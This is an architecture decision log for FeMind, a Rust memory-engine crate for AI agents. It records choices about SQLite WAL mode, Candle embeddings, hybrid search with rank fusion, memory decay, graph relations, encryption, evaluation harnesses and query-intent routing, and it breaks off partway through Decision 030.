# FeMind Decisions

This document records key architectural and design decisions for FeMind.

Decisions 001-007 originated during initial research (2026-03-16) and were carried forward into the current FeMind release line.

---

## Decision 001: FeMind Shared Memory Engine

**Date:** 2026-03-16

**Decision:** Create a standalone Rust crate (`femind`) providing pluggable, feature-gated persistent memory for AI agent applications.

**Context:** Multiple AI agent projects need persistent memory with search, scoring, and decay, yet the Rust ecosystem has no standalone crate for this. Research into Mem0, OMEGA, Zep/Graphiti, and MemOS confirms the patterns are converging industry-wide.

**Rationale:**
- Fills a clear gap in the Rust ecosystem for standalone agent memory (Engram is Go, Mem0 is Python)
- Improvements (vector search, graph, decay) benefit all consumers automatically
- Feature-gated design means zero cost for unused capabilities
- Every component is backed by published research or established open-source practice

**Consequences:**
- New standalone crate: `femind`
- Any Rust project can depend on FeMind for persistent agent memory
- See `ARCHITECTURE.md` for full specification

---

## Decision 002: WAL Mode for All SQLite Databases

**Date:** 2026-03-16

**Decision:** Enable WAL (Write-Ahead Logging) mode on all SQLite databases from day one.

**Context:** Concurrent read/write patterns are common in agent memory (orchestrator reads learnings while writing new error patterns).

**Rationale:**
- Concurrent reads don't block writes
- `synchronous = NORMAL` is corruption-safe in WAL mode, avoids FSYNC per write
- 500-1000 writes/sec on modern hardware while serving thousands of concurrent reads
- Zero code complexity — single pragma at connection time

**Consequences:**
- All databases: `PRAGMA journal_mode = WAL; PRAGMA synchronous = NORMAL;`
- WAL file appears alongside .db file (expected, not a bug)
- No impact on backup/copy procedures

---

## Decision 003: Candle Over ort for Local Embeddings

**Date:** 2026-03-16

**Decision:** Use HuggingFace Candle for local embedding inference, not ONNX Runtime (ort).

**Context:** Evaluated ort, candle, and fastembed-rs for local embedding inference.

**Rationale:**
- Pure Rust (ort requires C++ runtime, adds 80+ deps and ~350MB to binary)
- Native safetensors loading from HF Hub (no ONNX conversion step)
- WASM support (relevant for future GUI via WebView)
- Performance difference is negligible for MiniLM-sized models (~8ms per embed)
- Candle is well-proven in production for this exact use case
- `EmbeddingBackend` trait allows swapping to ort later if scale demands it

**Consequences:**
- Feature-gated behind `local-embeddings` flag
- Default model: `all-MiniLM-L6-v2` (384 dims, 22M params, ~80MB download) — updated by Decision 017
- Model downloaded from HF Hub on first use, cached locally
- Graceful degradation to FTS5-only if candle fails to load

---

## Decision 004: Hybrid Search with Reciprocal Rank Fusion

**Date:** 2026-03-16

**Decision:** Combine FTS5 keyword search and vector similarity search using Reciprocal Rank Fusion (RRF).

**Context:** FTS5 handles 80% of lookups well. Vector catches semantic matches FTS5 misses. Need a principled way to merge results.

**Rationale:**
- RRF is simple, effective, and parameter-light (just k-value)
- RRF is proven in production for agent memory workloads
- Dynamic k-values adjust weighting based on query type (quoted → keyword, questions → semantic)
- No learned fusion model needed
- Outperforms either approach alone

**Consequences:**
- Both search backends run in parallel, results merged via RRF
- When vector is unavailable, transparently falls back to FTS5-only
- Post-RRF scoring boosts applied for recency, importance, category, memory type

---

## Decision 005: ACT-R Activation Model for Memory Decay

**Date:** 2026-03-16

**Decision:** Use ACT-R cognitive architecture's activation formula for memory decay, replacing ad-hoc tier/trust/decay systems.

**Context:** Common approaches include manual trust scoring with decay, tier-based multipliers, and OMEGA's forgetting intelligence. All solve the same problem differently.

**Rationale:**
- Research-backed model from cognitive science (spaced repetition, forgetting curves)
- One unified formula replaces five separate mechanisms (trust, tiers, decay, reference counting, recency)
- Memories accessed frequently stay strong naturally (spaced repetition effect)
- Different decay rates per cognitive type (episodic=fast, semantic=slow, procedural=medium)
- Access log provides richer data than simple counters

**Consequences:**
- `memory_access_log` table tracks every retrieval with timestamp
- Activation computed at query time from access history
- Feature-gated behind `activation-model` (simpler projects can skip)
- Replaces ad-hoc confidence fields and tier systems

---

## Decision 006: Graph Memory via SQLite Relationship Tables

**Date:** 2026-03-16

**Decision:** Implement graph memory using SQLite relationship tables with recursive CTE traversal, not an external graph database.

**Context:** Graph memory provides 5-11% accuracy improvement on temporal and multi-hop queries (Mem0 benchmarks). Evaluated Kuzu (archived Oct 2025), Cozo (pure Rust), and SQLite CTEs.

**Rationale:**
- Zero new dependencies (SQLite recursive CTEs are built-in)
- Handles thousands of relationships efficiently (sufficient for personal/project scale)
- `memory_relations` table with standard relationship types (caused_by, solved_by, depends_on, etc.)
- Kuzu archived, Cozo less proven — SQLite is the safe starting point
- `GraphBackend` trait allows swapping to native graph DB later if needed

**Consequences:**
- Feature-gated behind `graph-memory`
- Recursive CTE traversal with cycle prevention and depth limits
- Connected memories receive scoring boost based on hop distance
- Temporal validity on relationships (valid_from/valid_until)
- Future: `graph-native` feature flag for Cozo or Kuzu fork if SQLite becomes bottleneck

---

## Decision 007: Consolidation Pipeline for Memory Quality

**Date:** 2026-03-16

**Decision:** Implement a three-stage consolidation pipeline (Extract → Consolidate → Store) to prevent duplicate and stale memories.

**Context:** Without consolidation, memories accumulate duplicates over months of use. Mem0's research shows consolidation is key to memory quality.

**Rationale:**
- Hash-based dedup (default) is zero-cost and prevents exact duplicates
- Similarity-based dedup (optional) catches near-duplicates with vector search
- LLM-assisted consolidation (optional) provides highest accuracy but costs tokens
- `ConsolidationStrategy` trait allows projects to choose their level
- Production experience demonstrates this is essential for memory quality

**Consequences:**
- Feature-gated behind `consolidation`
- Default: `HashDedup` (SHA-256, zero cost)
- Optional: `SimilarityDedup` (requires vector-search)
- Optional: `LLMConsolidation` (consumer provides LLM call)
- StoreResult reports what action was taken (added, updated, noop, etc.)

---

## Decision 008: Encryption at Rest via SQLCipher

**Date:** 2026-03-17

**Decision:** Use SQLCipher via rusqlite's `bundled-sqlcipher` feature for optional database-level encryption.

**Context:** Agent memories may contain sensitive information. OMEGA claims "encryption at rest" but only encrypts exports, not the main database. Application-level field encryption breaks FTS5 (can't tokenize ciphertext). Need a solution that preserves all search capabilities.

**Rationale:**
- SQLCipher provides transparent AES-256-CBC encryption at the page level
- Preserves FTS5, WAL mode, and vector search — encryption/decryption at I/O boundary
- 5-15% overhead on I/O operations, negligible for agent memory workloads
- rusqlite has first-class support via `bundled-sqlcipher` and `bundled-sqlcipher-vendored-openssl`
- BSD-3-Clause license, battle-tested (Signal, Mozilla, Adobe)
- Consumer provides the key — FeMind doesn't manage key storage

**Consequences:**
- Feature-gated behind `encryption` (replaces bundled SQLite with bundled SQLCipher)
- Optional `keychain` feature for OS keychain integration via `keyring` crate
- `EncryptionKey` enum: `Passphrase(String)` or `RawKey([u8; 32])`
- `PRAGMA key` must be first statement after connection open
- `encryption-vendored` variant for environments without system OpenSSL

---

## Decision 009: Benchmark Strategy

**Date:** 2026-03-17

**Decision:** Target LongMemEval as primary benchmark, with MemoryAgentBench and AMA-Bench as secondary targets. Ship benchmark harness as a separate workspace member.

**Context:** LongMemEval (ICLR 2025) is the de facto standard — 500 questions testing 5 core memory abilities. OMEGA claims 95.4% (marketing) but their own repo shows 76.8%. Hindsight scores 91.4%. FeMind achieved 95.6% on LongMemEval Oracle.

**Rationale:**
- LongMemEval is the standard leaderboard that competitors report against
- MemoryAgentBench (ICLR 2026) tests selective forgetting — directly validates ACT-R decay
- AMA-Bench tests agentic (non-dialogue) applications — FeMind's primary use case
- Benchmark harness must be separate from the library (large data, LLM judge dependency)
- Three specific additions drive the score from 88-93% to 93-96%: fact extraction at ingest, time-aware query expansion, exhaustive retrieval mode

**Consequences:**
- Benchmark development lives in the standalone RecallBench project
- Evaluation uses a standards-aligned judge configuration for benchmark parity
- Score targets guide feature prioritization

---

## Decision 010: Three-Tier Memory Hierarchy

**Date:** 2026-03-17

**Decision:** Add a tier system (0=episode, 1=summary, 2=fact) with tier-aware search, consumer-controlled consolidation, and soft-delete pruning.

**Context:** Over months of operation, episodic memories accumulate. TraceMem, MemGPT/Letta, and EverMemOS all implement progressive summarization. Mem0's insight: memory formation is selective, not compressive — choose what deserves retention rather than summarizing everything.

**Rationale:**
- Raw episodes are verbose and decay fast; summaries and facts are dense and durable
- Tier-aware search (Standard=tiers 1+2, Deep=+tier 0, Forensic=all) improves relevance within token budgets
- ACT-R activation naturally works with tiers — consolidated episodes lose activation and become prunable
- Consumer controls scheduling via explicit `consolidate()` and `prune()` calls (library, not framework)
- Soft delete as default preserves forensic capability

**Consequences:**
- `tier` column (0-2) added to memories table
- `source_ids` column for provenance tracking (JSON array of original memory IDs)
- `SearchDepth` enum controls which tiers are searched
- `LlmCallback` trait for LLM-assisted summarization (consumer provides, optional)
- LLM-free degraded path: vector clustering + statistical dedup
- `PruningPolicy` struct with configurable thresholds, type exemptions, graph-link protection

---

## Decision 011: WASM Support via Hybrid Architecture

**Date:** 2026-03-17

**Decision:** Support WASM compilation with a hybrid architecture — SQLite+FTS5 in browser WASM, embeddings server-side, with full-WASM candle as opt-in.

**Context:** rusqlite has official WASM support since v0.38.0 (Dec 2025) via `sqlite-wasm-rs`. Candle has a working all-MiniLM-L6-v2 WASM demo. No known project combines rusqlite + FTS5 + candle in WASM — FeMind would be novel.

**Rationale:**
- All pieces work today: rusqlite WASM, FTS5 enabled in WASM build, OPFS/IndexedDB persistence
- Hybrid recommended: SQLite+FTS5 in Web Worker (fast local queries, offline), embeddings via server API (native speed)
- Full-WASM candle is opt-in for offline/privacy use cases (~300-500MB browser memory)
- Same FeMind API surface via `cfg(target_family = "wasm")` conditional compilation
- Aligns with user's Solid.js web stack

**Consequences:**
- `wasm` feature flag activates `sqlite-wasm-rs` backend
- Persistence via OPFS (`sahpool` VFS) or IndexedDB (`relaxed-idb` VFS)
- Single-threaded in WASM (SQLite compiled with `SQLITE_THREADSAFE=0`)
- `EmbeddingBackend` trait enables swapping to API-based embeddings in browser context

---

## Decision 012: Fact Extraction at Ingest

**Date:** 2026-03-17

**Decision:** Add an `IngestStrategy` trait that allows consumers to extract atomic facts from raw input before storage, rather than storing verbatim text.

**Context:** The LongMemEval paper's single biggest finding: fact-augmented key expansion improves recall by +9.4% and accuracy by +5.4%. OMEGA's equivalent "key expansion" is a major driver of their benchmark score.

**Rationale:**
- Storing raw conversation turns is suboptimal — a single turn may contain multiple independent facts
- Extracting and indexing facts separately improves retrieval precision
- Default implementation stores as-is (zero cost); LLM-assisted implementation extracts atomic facts
- Aligns with Mem0's selective memory formation: choose what deserves retention

**Consequences:**
- `IngestStrategy` trait with `extract()` method returning `Vec<ExtractedFact>`
- Default `PassthroughIngest` stores text as-is
- `LlmIngest` uses `LlmCallback` to extract facts (consumer controls cost)
- Extracted facts stored as separate Tier 2 memories linked to source via `source_ids`

---

## Decision 013: Cross-Encoder Reranking

**Date:** 2026-03-17 (updated: 2026-03-18 — switched from fastembed to candle BERT after Decision 016)

**Decision:** Add an optional `RerankerBackend` trait for post-retrieval cross-encoder reranking, implemented via candle's standard BERT model with a classification head.

**Context:** Hindsight uses four parallel retrieval strategies with cross-encoder reranking (91.4% LongMemEval). Reranking after RRF fusion is now standard in competitive memory systems. Cross-encoders are architecturally just BERT + linear classifier that score (query, document) pairs jointly — candle already has BERT support, so no additional dependencies beyond what `local-embeddings` provides.

**Rationale:**
- Cross-encoder reranking improves precision by scoring query-document pairs jointly
- RRF merge is effective but operates on independent rankings — reranking captures cross-attention
- A cross-encoder is a standard BERT model with a single-output classification head — candle already has `BertModel`
- Default model: `cross-encoder/ms-marco-MiniLM-L-6-v2` (22M params, safetensors available on HF)
- Shares candle deps with the embedding module — zero additional binary size
- Feature-gated so projects that don't need it pay zero cost

**Consequences:**
- `RerankerBackend` trait with `rerank(query, documents) -> Vec<f32>` method
- `CandleReranker` implementation (~50-80 lines) using candle BERT + linear head
- Applied after RRF merge, before final scoring
- Feature-gated behind `reranking` (depends on `local-embeddings`)
- Consumer can provide custom `RerankerBackend` implementation

---

## Decision 014: Memory Evolution (Post-Write Hooks)

**Date:** 2026-03-17

**Decision:** When a new memory is stored, optionally trigger re-evaluation and update of related existing memories.

**Context:** A-MEM (NeurIPS 2025) and Cognee demonstrate that new memories should trigger updates to existing memories' attributes, keywords, and links. This "memory writes back to memory" pattern improves multi-hop reasoning and keeps the memory graph current.

**Rationale:**
- Static memory storage means related memories become stale as context evolves
- Post-write hooks retrieve top-k similar memories and optionally update their metadata/links
- Enables Zettelkasten-style bidirectional linking (A-MEM's core innovation)
- Consumer controls whether evolution runs (opt-in, not default)

**Consequences:**
- Optional `EvolutionStrategy` trait
- Post-write pipeline: store → retrieve similar → evaluate → update metadata/links
- Can use `LlmCallback` for intelligent evaluation, or rules-based for zero-cost
- Graph relationships created/updated automatically when evolution detects connections

---

## Decision 015: LlmCallback Trait

**Date:** 2026-03-17

**Decision:** Define a single `LlmCallback` trait for all LLM-assisted operations. Consumer provides the implementation, controlling model choice, cost, and retry logic.

**Context:** Multiple features need LLM assistance: consolidation (LLMConsolidation), fact extraction (LlmIngest), memory evolution, and reflection. FeMind should never call an LLM directly — the consumer controls cost.

**Rationale:**
- Single trait avoids proliferation of callback types
- Consumer decides model (Claude, GPT, local Llama), token budget, retry behavior
- `Option<&dyn LlmCallback>` — when None, all features degrade gracefully to non-LLM paths
- Library, not framework — FeMind provides operations, consumer provides intelligence

**Consequences:**
- `LlmCallback` trait with `complete(prompt: &str) -> Result<String>`
- Used by: `LLMConsolidation`, `LlmIngest`, `EvolutionStrategy`, `reflect()`
- All LLM-dependent features work (degraded) without an LLM callback

---

## Decision 016: Custom Candle Embedding Module (Replaces fastembed-rs)

**Date:** 2026-03-17 (updated: 2026-03-18 — replaced fastembed with custom candle)

**Decision:** Build a custom embedding module (~100-130 lines) inside FeMind using candle-transformers' native ModernBERT implementation. Drop fastembed-rs entirely.

**Context:** fastembed-rs stability assessment (March 2026) revealed: single maintainer (Anush008/Qdrant, bus factor 1), pinned to pre-release `ort =2.0.0-rc.11`, ships 50-150MB C++ ONNX Runtime shared library, uses `anyhow` in library crate, yearly breaking major versions. candle-transformers already has native ModernBERT support (PR #2791, merged March 2025), and all-MiniLM-L6-v2 ships safetensors weights that candle loads directly.

**Rationale:**
- Pure Rust — no C++ shared library, no ONNX Runtime, aligns with design principle #5
- candle-transformers has native ModernBERT (GeGLU, alternating attention, RoPE) — no architecture gaps
- all-MiniLM-L6-v2 ships `model.safetensors` (95MB), `config.json`, `tokenizer.json` — everything candle needs
- Eliminates: fastembed (single-maintainer), ort (pre-release pin), ndarray, anyhow (transitive)
- ~100-130 lines replaces an external crate with full ownership
- `EmbeddingBackend` trait still lets consumers plug in fastembed or anything else if they want
- HuggingFace maintains candle — larger team, stronger long-term backing than fastembed

**Consequences:**
- `CandleBackend` is the primary backend on all native targets (feature: `local-embeddings`)
- Native default model: `all-MiniLM-L6-v2` (BERT, 384-dim)
- WASM uses the same model (standard BERT compiles to WASM cleanly)
- No more dual-model split — same vectors everywhere (native, WASM, API)
- Cross-model vectors are isolated: different models produce incomparable embedding spaces despite same dimensionality — see Decision 020
- Dependencies: `candle-core`, `candle-nn`, `candle-transformers`, `tokenizers`, `hf-hub`
- Model cached at `~/.cache/femind/models/`, auto-downloaded on first use
- No `FastembedBackend` in FeMind — removed from codebase

---

## Decision 017: Default Embedding Model — all-MiniLM-L6-v2

**Date:** 2026-03-17 (updated: 2026-03-18 — removed fastembed references after Decision 016 revision)

**Decision:** Use `all-MiniLM-L6-v2` (22M params, 384-dim) as the default embedding model on ALL targets. Same model native, WASM, and API.

**Context:** Originally chose granite-small-r2 (ModernBERT, 47M params) for higher code retrieval scores. Switched to all-MiniLM-L6-v2 because: (1) granite's ModernBERT doesn't compile to WASM, forcing a dual-model split with bge-small for browsers — vectors were incompatible across platforms; (2) MiniLM is 3x faster on CPU; (3) MiniLM is available on DeepInfra and other API providers for fast batch embedding; (4) the 3-4 point MTEB gap is negligible when combined with hybrid search (FTS5 + vector + RRF + reranking).

**Rationale:**
- Standard BERT architecture — works everywhere (native, WASM, any API provider)
- Same vectors from local Candle and DeepInfra API — interchangeable, no cross-model issues
- 22M params, 6 BERT layers — fast on CPU, suitable for real-time embedding
- 384 dimensions, Apache 2.0 license, ~80MB safetensors
- Most widely deployed embedding model in the world — battle-tested

**Consequences:**
- `CandleBackend::new()` auto-downloads all-MiniLM-L6-v2 from HuggingFace
- `ApiBackend::deepinfra_minilm(api_key)` uses the same model via API
- No more dual-model WASM/native split — one model everywhere
- Supersedes the original granite-small-r2 selection
- `all-MiniLM-L6-v2` not used

---

## Decision 018: Reflection Operation

**Date:** 2026-03-19

**Decision:** Implement periodic reflection via `engine.reflect()` that synthesizes higher-order insights from accumulated memories, stored as Semantic Tier 2 memories with provenance links.

**Context:** Research shows removing reflection causes agent behavior to degenerate within 48 hours (Hindsight). The `reflect()` method clusters accumulated memories and generates summary insights using the `LlmCallback` trait.

**Rationale:**
- Prevents memory systems from becoming flat accumulations of facts without synthesis
- Produces durable Tier 2 semantic memories that improve search relevance
- Depends on existing `LlmCallback` trait — no new external dependencies
- Consumer controls when and how often reflection runs (library, not framework)
- Degraded path without LLM: vector clustering produces statistical summaries

**Consequences:**
- `engine.reflect(&dyn LlmCallback)` method on MemoryEngine
- Results stored as Semantic Tier 2 memories with `source_ids` provenance
- Consumer decides scheduling (daily, weekly, on-demand)
- Part of the `maintain()` convenience method alongside consolidation and pruning

---

## Decision 019: Synchronous Core API

**Date:** 2026-03-19

**Decision:** Core MemoryEngine operations (CRUD, search, context assembly, scoring) are synchronous. Async is reserved for embedding inference, LLM callbacks, and network I/O.

**Context:** The architecture initially used `async fn` throughout, requiring `tokio` as a mandatory dependency. This contradicts the "library, not framework" principle — forcing an async runtime on consumers who may use different runtimes or none at all. Core operations are SQLite queries that complete in microseconds to milliseconds.

**Rationale:**
- SQLite operations are inherently synchronous — wrapping them in async adds overhead without benefit
- Removes tokio as a mandatory dependency (moved behind `vector-search` and `mcp-server` feature flags)
- Consumers using synchronous code don't need to pull in an async runtime
- CPU-bound embedding inference uses `std::thread::spawn` / `rayon`, not async (which is for I/O-bound work)
- The `EmbeddingBackend` and `LlmCallback` traits remain async for legitimate I/O (model download, API calls)

**Consequences:**
- `store()`, `get()`, `update()`, `delete()`, `search().execute()`, `assemble_context()` are all `fn`, not `async fn`
- `MemoryEngine::builder().build()` is synchronous
- Background embedding indexer runs on a dedicated thread, not a tokio task
- Minimum Rust version: 1.85 (edition 2024, native async traits)
- `tokio` moves to feature-gated dependency

---

## Decision 020: Cross-Model Vector Isolation

**Date:** 2026-03-19

**Decision:** Vectors from different embedding models are isolated — vector search is skipped for records whose stored `model_name` differs from the current backend's model. The engine falls back to FTS5-only for mismatched records.

**Context:** The architecture previously claimed all-MiniLM-L6-v2 and bge-small-en-v1.5 produce "cross-compatible" 384-dim vectors with only 5-10% quality degradation. This is incorrect. Different model architectures produce fundamentally different embedding spaces — cross-model cosine similarity produces unreliable rankings, not slightly degraded ones.

**Rationale:**
- Vectors from different models are not comparable even at the same dimensionality
- Returning random-seeming rankings is worse than returning no vector results
- FTS5 graceful fallback ensures search still works when switching platforms (native ↔ WASM)
- The `model_name` field on `memory_vectors` enables clean model migration via `reindex_all()`
- Honest about limitations rather than presenting unreliable results

**Consequences:**
- Vector search query filters by `model_name = current_backend.model_name()`
- When native user accesses a database created in WASM (or vice versa), vector search is skipped — FTS5 handles retrieval
- `reindex_all()` re-embeds all memories with the current model, restoring vector search
- Removes misleading "cross-compatible vectors" claim from documentation

---

## Decision 021: Structured Error Types

**Date:** 2026-03-19

**Decision:** Define a structured `FemindError` enum using `thiserror` with variants for each failure domain, enabling consumers to match on specific error conditions.

**Context:** Library crates need structured errors so consumers can handle failures appropriately (retry on transient DB errors, surface model-not-found to users, etc.). A single `anyhow::Error` or `Box<dyn Error>` prevents pattern matching.

**Rationale:**
- Consumers need to distinguish database errors from embedding errors from serialization errors
- `thiserror` provides zero-cost error types with `Display` and `From` implementations
- Each feature-gated module contributes its own error variants
- `FemindError::ModelMismatch` enables clear messaging when vector search falls back to FTS5

**Consequences:**
- `femind::Result<T>` type alias used throughout the public API
- Error variants: `Database`, `Embedding`, `ModelNotAvailable`, `ModelMismatch`, `Serialization`, `Migration`, `Encryption`, `Consolidation`, `LlmCallback`
- Feature-gated variants only exist when their feature is enabled

---

## Decision 022: Remote MiniLM Is The Same Profile, Not A New Model Family

**Date:** 2026-03-29

**Decision:** FeMind will treat local CPU MiniLM and remote/local-network GPU
MiniLM as execution modes of the same embedding profile when the model assets,
dimensions, preprocessing, truncation, pooling, and normalization match.

**Context:** FeMind and Memloft both use `sentence-transformers/all-MiniLM-L6-v2`
at `384` dimensions for local embeddings. The next production step is to let
applications offload that same profile to a CUDA-capable machine on the local
network without invalidating existing vectors or turning RecallBench-specific
infrastructure into product architecture.

**Rationale:**
- Remote execution should not force a model-family split when the underlying
  embedding profile is unchanged
- Existing Memloft vectors can remain valid if profile identity is preserved
- Profile verification is safer than trusting a remote service by model label
  alone
- A narrow embedding-only service is reusable across production apps and
  benchmark tooling

**Consequences:**
- Canonical logical model label should be `local-minilm`
- Full repo/dimension/preprocessing identity belongs in the embedding profile
- FeMind should add a first-class `RemoteEmbeddingBackend`
- Remote service verification must check profile identity, not just dimensions
- Local fallback remains valid as long as both sides implement the same profile
- If the profile changes, vectors must be treated as reindex candidates rather
  than as cross-compatible data
- The service host should report resolved runtime mode (`local-cpu` or
  `local-gpu`) independently from the stable profile identity
- The remote host should be operated through a FeMind-native CLI and deployment
  path, not a RecallBench-only or app-specific wrapper
- Service lifecycle should default to a warm `systemd` process with Windows/WSL
  autostart controls for `off`, `status`, `logon`, and `startup`

---

## Decision 023: Initial Public Naming Direction

**Date:** 2026-03-19

**Decision:** Use a temporary public package and repository reservation before the suite naming settled on `femind`.

**Context:** Evaluated 25+ candidate names across crates.io, npm, PyPI, and GitHub. Key criteria: available on crates.io, short and memorable, low GitHub namespace collision, evocative of the library's purpose.

**Rationale:**
- Available on all three package registries (crates.io, npm, PyPI) at time of evaluation
- Short (8 chars), easy to type, clearly communicates "cognitive/mind + core engine"
- Minimal GitHub presence (58 repos, top has 3 stars — all abandoned/tiny)
- Strong alternatives (`cognimem`, `cogmem`, `mnemic`) were also clean but a direct cognitive-memory name communicated the crate's purpose best at that stage

**Consequences:**
- crates.io: placeholder publication reserved the namespace before the suite rename
- GitHub: initial repository was created before the suite rename
- npm: a scoped package name is still the likely path if JS bindings ship
- PyPI: deferred until Python bindings are built
- All documentation moved off the earlier `memcore` draft name at that stage

---

## Decision 024: Engine-First Validation Before Benchmarking

**Date:** 2026-03-30

**Decision:** Treat FeMind's practical and real-world regression suites as the
active tuning loop, and defer benchmark-style evaluation to milestone
checkpoints after meaningful engine changes.

**Context:** Benchmarking was useful for exposing broad retrieval ceilings, but
it started to distort prioritization. FeMind's job is to become a strong
production memory engine first, not to optimize its architecture around one
external benchmark shape before core retrieval behavior is settled.

**Rationale:**
- The practical suite, live-library suite, and memloft-derived slice are closer
  to the actual production scenarios FeMind is meant to serve
- Engine-centric tests are cheaper to run, easier to debug, and easier to make
  deterministic
- They separate retrieval quality from answer-model and judge-model variance
- They make it possible to add granular diagnostics and route-specific tuning
  that benchmark harnesses do not provide

**Consequences:**
- `eval/practical/`, `eval/live-library/`, and `eval/memloft-slice` are the
  primary tuning loop
- Benchmark work is paused except for occasional milestone checks
- Query-intent routing and richer retrieval diagnostics become higher priority
  than benchmark-specific adaptation
- Practical evaluation output should expose more granularity about why a check
  failed and which retrieval path ran

---

## Decision 025: QueryIntent Routing With Explicit Temporal Policy

**Date:** 2026-03-30

**Decision:** Route retrieval through an inferred `QueryIntent` and attach an
explicit temporal policy to the route instead of relying only on generic
post-search heuristics.

**Context:** FeMind already had lexical grounding, reranking, and some
query-shape heuristics, but all queries still shared the same underlying search
behavior. That made it harder to tune current-state, historical-state,
aggregation, exact-detail, and abstention-style questions independently.

**Rationale:**
- Different question families need different retrieval behavior
- Current-vs-historical questions need more than text matching; they need a
  consistent recency direction in ranking
- The practical and real-world suites are easier to debug when the routed plan
  is explicit and serialized in the summary artifact

**Consequences:**
- FeMind now infers `general`, `exact-detail`, `current-state`,
  `historical-state`, `aggregation`, and `abstention-risk` routes
- Routes can change mode, depth, grounding, query alignment, rerank limits, and
  temporal bias
- Current-state routes mildly favor newer evidence by `created_at`
- Historical-state routes mildly favor older evidence by `created_at`
- Practical summaries now show the routed plan per retrieval-style check so
  intent-level regressions can be tuned directly

---

## Decision 026: Explicit State/Conflict Retrieval Policy

**Date:** 2026-03-30

**Decision:** Treat supersession and validity windows as first-class retrieval
signals, not just incidental graph metadata.

**Context:** After `QueryIntent` routing and temporal bias landed, FeMind still
handled changed facts too bluntly. Current-state queries mostly benefited from
recency, while graph filtering always demoted superseded facts regardless of
whether the caller wanted the current answer or the earlier one. The search
builder also exposed `valid_at(...)` without actually enforcing it.

**Rationale:**
- Current-state and historical-state questions need different conflict behavior,
  not only different timestamp bias
- Supersession links should help retrieval in both directions:
  forward to the replacement fact for current-state questions, and backward to
  the prior fact for historical-state questions
- Validity windows have to affect real retrieval if FeMind is going to model
  state over time cleanly

**Consequences:**
- Query routes now carry a `state_conflict_policy` alongside `QueryIntent` and
  temporal policy
- Current-state routes demote superseded memories and can walk forward through
  `SupersededBy` links to the replacement fact
- Historical-state routes can walk backward through `SupersededBy` links to the
  prior state and demote current-state replacements when appropriate
- `SearchBuilder::valid_at(...)` now filters against `valid_from` /
  `valid_until` instead of being a no-op
- Memory store writes now persist `valid_from` / `valid_until` when the
  `temporal` feature is enabled
- Practical evaluation summaries now record state/conflict policy statistics in
  addition to intent-level breakdowns

---

## Decision 027: Practical Scenarios Can Seed Explicit Graph Relations

**Date:** 2026-03-30

**Decision:** Allow the practical eval harness to seed explicit graph links
between source records, and use that path to keep linked current-vs-historical
state behavior under regression.

**Context:** Query routing, temporal bias, and state/conflict policy were in
place, but the practical suite still seeded only standalone records. That meant
the most important linked-state behaviors were covered by unit tests more than
by the real engine-first regression loop.

**Rationale:**
- FeMind needs real-world regression coverage for supersession chains and
  conflict sets, not only isolated unit tests
- Some state-history questions should be answered because the memory graph is
  explicit, not because the prose itself happens to contain words like
  "superseded"
- The practical harness is the right place to preserve this coverage because it
  stays deterministic and cheap to debug

**Consequences:**
- `eval/practical/scenarios.json` can now define `records[].key` and a
  `relations[]` block
- The practical runner maps those record keys to stored memory IDs and creates
  graph edges during corpus seeding
- The practical suite now includes a linked supersession/history scenario that
  exercises current-state and historical-state retrieval over the same fact
  family
- Linked conflict-set bias is now validated by both unit tests and the
  engine-first practical regression loop

---

## Decision 028: Practical Eval Needs Coverage-Sensitive Retrieval Criteria

**Date:** 2026-03-30

**Decision:** Extend the practical eval harness so retrieval checks can express
coverage-sensitive criteria like required fragments, forbidden fragments,
minimum hit counts, and scenario-level graph depth instead of relying only on
loose expected-answer overlap.

**Context:** After the routed temporal and state/conflict work stabilized,
FeMind needed broader engine-first coverage for aggregation, graph-assisted, and
provenance-heavy questions. The older practical checks could tell us whether a
query roughly matched, but they were too coarse to say whether an aggregation
query surfaced the full provider set or whether a provenance query stayed
grounded to the right artifact detail.

**Rationale:**
- Aggregation and provenance scenarios need more than semantic similarity to be
  useful tuning signals
- Graph-assisted scenarios should be able to opt into graph depth without
  forcing that behavior across the whole suite
- Practical summaries should explain why a check failed so tuning work can
  target routing, graph expansion, grounding, or hit coverage directly

**Consequences:**
- Aggregation routes now switch to exhaustive search when the caller has not
  explicitly overridden the mode
- Practical scenarios can declare `graph_depth` per scenario or per check
- Retrieval checks can declare `required_fragments`, `forbidden_fragments`, and
  `min_observed_hits`
- Practical summaries now include mode, temporal-policy, and graph-depth
  pass-rate breakdowns
- Per-check output now records retrieval-criteria diagnostics so aggregation and
  provenance regressions fail for explicit reasons instead of only by token
  overlap
- The practical suite now includes explicit aggregation, multi-hop graph, and
  provenance/abstention scenarios in addition to linked state-history coverage

---

## Decision 029: Graph-Assisted Retrieval Is Part of the Routed Plan

**Date:** 2026-03-30

**Decision:** Treat graph expansion as a routed query behavior instead of only
an external assembly knob.

**Context:** FeMind already had graph traversal in `search_with_config`, but it
only activated when callers forced a nonzero `AssemblyConfig.graph_depth`. That
meant graph-aware behavior lived mostly in the eval harness instead of the
engine’s own routed plan.

**Rationale:**
- Multi-hop questions should trigger graph expansion because of query shape, not
  only because a caller knew to force graph depth ahead of time
- Engine-first evaluation is more trustworthy when the routed plan itself owns
  graph behavior
- Graph-connected questions can need a simpler seed query than the original
  natural-language phrasing, so the engine should generate one when routing says
  the query is graph-shaped

**Consequences:**
- `QueryRoute` now carries a routed `graph_depth`
- `search_with_config` and context assembly can apply routed graph expansion
  when callers leave `AssemblyConfig.graph_depth` at `0`
- The engine now derives a graph-seed query variant for routed graph questions
  so multi-hop expansion can start from stronger lexical/semantic anchors
- Practical summaries now show routed graph depth explicitly
- The graph-connected practical scenario now passes with global graph depth `0`,
  proving that graph expansion is being selected by the route rather than by a
  scenario-specific override

---

## Decision 030: Aggregation Uses Engine-Level Composition, Not Just Top-K Hits

**Date:** 2026-03-30

**Decision:** Treat aggregation questions as a first-class engine path that
collects distinct supporting memories and emits coverage-oriented aggregation
metadata, while narrowing abstention-risk routing so generic yes/no questions
with phrases like "at all" are not mistaken for unsupported-presence probes.

**Context:** FeMind already routed aggregation queries to `SearchMode::Exhaustive`,
but the eval loop still tended to look at a narrow observed hit list. That made
rollup questions harder to diagnose and hid whether the engine had broad enough
coverage. At the same time, a memloft-slice regression showed that the
abstention-risk heuristic was too broad: "Should benchmark history still matter
at all?" was being zeroed out as if it were a missing-fact probe.

**Rationale:**
- Aggregation needs engine-owned composition behavior, not only better scoring
  on ordinary retrieval results
- Coverage-sensitive questions should expose total matches, distinct supporting
  matches, and the composed evidence text that would feed downstream answer
  generation
- Exhaustive aggregation should use broader OR-style lexical coverage than the
  stricter path used for exact-detail retrieval
- Abstention heuristics should target unsupported presence/mention probes, not
  generic yes/no policy questions

**Consequences:**
